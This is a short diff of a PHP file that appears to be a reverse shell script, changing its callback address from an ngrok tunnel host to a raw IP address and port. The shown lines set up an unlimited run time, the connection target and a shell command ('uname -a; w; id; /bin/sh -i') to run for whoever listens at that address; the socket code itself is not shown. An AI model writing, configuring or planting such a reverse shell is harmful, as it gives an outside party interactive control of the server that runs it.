@@ -1,7 +1,7 @@
 <?php
 
 set_time_limit (0);$VERSION = "1.0";
-$ip = '2.tcp.ngrok.io';$port = 18689;
+$ip = '51.79.241.133';$port = 8080;
 $chunk_size = 1400;$write_a = null;$error_a = null;$shell = 'uname -a; w; id; /bin/sh -i';$daemon = 0;$debug = 0;
 
 if (function_exists('pcntl_fork')) {
